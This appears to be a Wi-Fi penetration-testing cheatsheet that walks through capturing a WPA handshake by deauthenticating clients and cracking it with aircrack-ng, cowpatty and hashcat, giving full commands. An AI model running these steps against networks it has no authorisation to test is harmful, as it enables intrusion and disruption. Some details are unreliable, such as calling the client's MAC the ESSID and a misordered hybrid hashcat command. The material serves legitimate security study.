# Wifi penetration Theeury and in-depth

## wifi encryption standards

| Protocol                      | Status   | Security level  |  extra                                   |
| :-------                      | :-----   | :-------------  | :-----                                   |
| 802.11  (Legacy)              |Deprecated  | Very Weak     |                                          |
| 802.11b (WEP)                 |Deprecated  | Very Weak     |                                          |
| 802.11g/n  (WPA)              |Deprecated  | Weak          |                                          |
| 802.11n/ac (WPA2)             |Widely Used | Strong        |                                          |
| 802.11ac/ax (WPA3)            |Current     | Strongest     |                                          |
| Open Networks                 |Active      | No Security   |                                          |
| Oppertunistic Wireless (OWE)  |Emerging    | some security | Better than open but lacks authentication|
| WPA2 - Enterprice             |Active      | High          | High with certificate validatinon        |
| WPA3 - Enterprice             |Active      | Very High     |                                          |


## Traditional WPA PW Attack

**Reconnaissance**:
Identify Nearby network wifi netowrks using airodump-ng
  - Setup monitormode on your network interface with airmon-ng Or with ifconfig/iwconfig
  - Start airodump-ng either on specific channel or listen in and find network.
**Hackshake Capture**
Capture handshake with airodump-ng.
  - start airodump-ng, possibly on a channel, and enable output to capture the handshake
  - use aireplay to generate network traffic as a client to the Access point to Deauth the client. This will make the client and AP make a "new" handshake, which is the one captured.
**Crack Password**
Crack the password with a tool like aircrack-ng, john, hashcat, or cowpatty. Either use Wordlist or bruteforce every combination(this takes alot of time)
- You can use custom made password lists with tools
- Some MAC ADdresses will tell you the Organization that manufactoredd the device, by the OUI ( 6 first digits in the hexadecimal MAC Address) This enables the use of default credentials for the manufactor, tools or wordlists can be found.

**Verify Access**
log on with the key/password which was cracked in previous step.
- either use the GUI or CLI method of connecting to the wifi.




# Aircrack-ng
## Airmon-ng
List network interfaces and status
```
airmon-ng
```
Check processess'
```
airmon-ng check
```
Enable monitor mode, this example the network interface is wlan0, which is then made to wlan0mon.
```
sudo airmon-ng start wlan0  
```
Disable monitor mode on wlan0mon
```
sudo airmon-ng stop wlan0mon
```

Remember to restart disabling monitormode.
  etc use `sudo service network-manager start`

## Airodump-ng
Listen on network interface for traffic 
```
sudo airodump-ng wlan0mon -c 1 -w Captured_file
```
Listen on network interface : `wlan0mon`
for network traffic on channel 1: `-c 1`
Save the output in captured_file: `-w captured_file`

The file output will be cap, pcap etc. ( captured_file.cap )
Before cracking the capture some additional steps might be needed. 
See under each of the tool.

### Additional information
Channel can be left empty, then it will jump from channel to channel.
Channel can be set to a range of numbers, one number or others...

#### **Checking if there is a valid handhshake**
You can check if ther eis a valid handshake using cowpatty, a tool later mentioned alone.
However here is the command
```
cowpatty -c -r captured_file.cap
```


#### **Conecepts of Results**
BSSID = MAC of the AP
PWR = Power of network, higher = better
Beacon = number of becons
Data = amount of packets captured
#/s = Packets caputre last 10 sec
CH = Channel 
MB = Max speed
Enc = Encryption Method used
Cipher = chiper used 
Auth = authentication used

ESSID = The MAC of the Client 
Rate = Data transfer rate betweeen client and ap
Lost = Packets lost
Packets = Packets send from client
Notes = additional information
Probes = The list of networks probed 

## Aireplay-ng 
Sends packets as a "client" which is on the network, this will cause an err and make the client and ap redo a handshake.

To launch packets as a client
```
sudo aireplay-ng -0 5 -a <BSSID> -c <ESSID> wlan0mon
```
Use the Deauth method : `-0`
Send 5 packets : `5`
The Access point Targeted's BSSID `-a <BSSID>`
The Client which is deauthenticated: `-c <ESSID>`
The network interface used: `wlan0mon`

Now the handshake will take place and airodump-ng will capture it and store it.





# hashcat
## Before cracking
Before cracking the airodump-ng capture the file, we must make it into a format hashcat can work with and understand.
Use hcxpcapngtool to create the hash which can be used by hashcat.
```
hcxpcapngtool -o hash_of_password captured_file.cap
```
The captured file : `captured_file.cap`
the output is saved in hash_of_password:`-o hash_of_password`
The generated new file is now in a hash format hashcat can work with

## commands



## Hashcat Commands
Hashcat is a videly used tool for many types of cracking not only for wifi.

### Basics

| Fucntions  | Functionality | example |
| :--------- | :------------ | :------ |
| `-m X`     | Specify Hash type X, can be left blank and hashcat will attempt to guess scheme | -m 22000 |
| `-a X`     | Specifies Attack mode | -a 3 |

### Advanced and Tailored

| Fucntions  | Functionality | example |
| `-I`       | Give a list of available CPU and GPU devices | -I |
| `-D X`     | Speifies what type of device used either 1 GPU or 2 CPU| -D 1 |
| `-d X`     | Specifies specific device ( Used -I to find devices ) | -d 8 |











# The Cheatsheet
## Capture and Validate
**Enable monitor mode, this example the network interface is wlan0, which is then made to wlan0mon.**
```
sudo airmon-ng start wlan0  
```
**Enable monitor mode  ~ Alternativly**
```
sudo ifconfig wlan0 down
sudo iw wlan0 set monitor control
sudo ifconfig wlan0 up
```

**Listen on network interface for traffic on channel 1 using wlan0mon interface and save it in FILE**
```
sudo airodump-ng wlan0mon -c 1 -w FILE
```

**Make the deauth** 
```
sudo aireplay-ng -0 5 -a <BSSID> -c <ESSID> wlan0mon
```

**Check for handshake **
```
cowpatty -c -r FILE.cap
```
**Make Hash for hashcat (hcxpcaptool)** 
```
hcxpcaptool -o HASH FILE.cap
```
**Make Hash for John (./wpapcap2john)** 
```
./wpapcap2john FILE.cap > HASH
```

## Cracking
Hashcat w/ wordlist on WPA Encryption 
```
hashcat -m 22000 HASH WORDLIST   
```
Hashcat w/ Combinator: 2 wordlists on WPA Encryption
```
hashcat -a 1 -m 22000 HASH WORDLIST WORDLIST2
```
Hashcat w/ Mask on WPA Encryption
```
hashcat -a 3 -m 22000 HASH 'MASK'
```
Masks:
|  Command   | Description  |
|   :--      |    :--                |
|    `?l`    |Lowercase ASCII letters|
|    `?u`    |Uppercase ASCII letters|
|    `?d`    |Digits  |
|    `?h`    |Digits and lowercase ASCII letters|
|    `?H`    |Digits and Uppercase ASCII letters|
|    `?s`    |Special Characters|
|    `?a`    |Digits,Special characters, Lower- & Uppercase ASCII letters|
|    `?b`    |All posible byte values|


Hashcat w/ Mask W/ Boundary on WPA Encryption
```
hashcat -a 3 -m 22000 HASH --increment --increment-min 8 --increment-max=14 'MASK_OF_14_Chars'
```

Hashcat w/ Hybrid: Wordlist + Mask on WPA Encryption
```
hashcat -a 6 -m 22000 HASH WORDLIST 'MASK'
```
Hashcat w/ Hybrid: Mask + Wordlist on WPA Encryption
```
hashcat -a 7 -m 22000 HASH WORDLIST 'MASK'
```















